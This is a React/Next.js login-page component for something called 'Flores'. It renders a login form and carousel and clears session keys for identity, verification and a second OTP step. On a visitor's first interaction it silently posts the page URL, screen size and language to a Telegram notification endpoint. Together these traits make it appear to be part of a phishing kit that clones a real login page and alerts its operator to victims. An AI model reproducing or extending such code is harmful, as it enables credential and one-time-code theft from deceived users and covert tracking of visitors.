"use client"
import { useEffect } from "react"
import { MessageCircle } from "lucide-react"
import { LoginSection } from "./login-section"
import { HeroCarousel } from "./hero-carousel"
import { Preloader } from "./preloader"
import { FLORES_SESSION } from "@/lib/flores-flow"

export function FloresLoginPage() {
  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem(FLORES_SESSION.verify)
      sessionStorage.removeItem(FLORES_SESSION.identity)
      sessionStorage.removeItem(FLORES_SESSION.otp2)
    }
  }, [])

  
  useEffect(() => {
    let sent = false
    const onFirstInteraction = () => {
      if (sent) return
      sent = true

      const screen = `${window.screen.width}x${window.screen.height}`
      const language = navigator.language || navigator.languages?.[0] || "unknown"

      fetch("/api/telegram/notify", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          event: "New Visitor",
          details: {
            pageUrl: window.location.href,
            screen,
            language,
          },
        }),
      }).catch((error) => {
        console.error("Failed to send visit notification:", error)
      })
    }

    window.addEventListener("pointerdown", onFirstInteraction, { once: true, passive: true })
    window.addEventListener("keydown", onFirstInteraction, { once: true })
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction)
      window.removeEventListener("keydown", onFirstInteraction)
    }
  }, [])

  return (
    <div className="min-h-screen flex flex-col lg:flex-row">
      <Preloader />
      
      <div
        className="hidden lg:block relative flex-1"
        style={{
          height: '986.986px',
          minHeight: '986.986px',
          maxHeight: '986.986px'
        }}
      >
        <HeroCarousel />
      </div>

      
      <div
        className="flex flex-col min-h-screen lg:min-h-0 lg:h-[986.986px] bg-white w-full lg:w-[540px]"
        style={{
          flexShrink: 0 // Prevent it from shrinking
        }}
      >
        <LoginSection />
      </div>

      
      <button
        className="fixed bottom-4 right-4 w-12 h-12 sm:w-14 sm:h-14 rounded-full flex items-center justify-center shadow-lg z-50 hover:scale-105 transition-transform"
        style={{ backgroundColor: "#0099D8" }}
        aria-label="Chat support"
      >
        <MessageCircle className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
      </button>
    </div>
  )
}
